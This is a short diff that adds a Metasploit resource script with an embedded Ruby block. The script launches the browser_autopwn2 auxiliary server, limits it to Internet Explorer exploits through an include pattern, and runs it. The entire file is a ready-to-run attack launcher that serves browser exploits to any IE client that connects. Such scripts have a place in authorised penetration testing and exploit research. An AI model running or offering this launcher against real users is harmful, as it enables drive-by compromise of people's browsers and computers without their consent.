@@ -1,0 +1,8 @@
+<ruby>
+print_status("Starting Browser Autopwn with IE-only BrowserExploitServer-based exploits.")
+print_status("Older IE exploits don't use BES, therefore will not be loaded.")
+run_single("use auxiliary/server/browser_autopwn2")
+run_single("set INCLUDE_PATTERN (ms\\\\d\\\\d_\\\\d+|ie)_")
+run_single("set ShowExploitList true")
+run_single("run")
+</ruby>
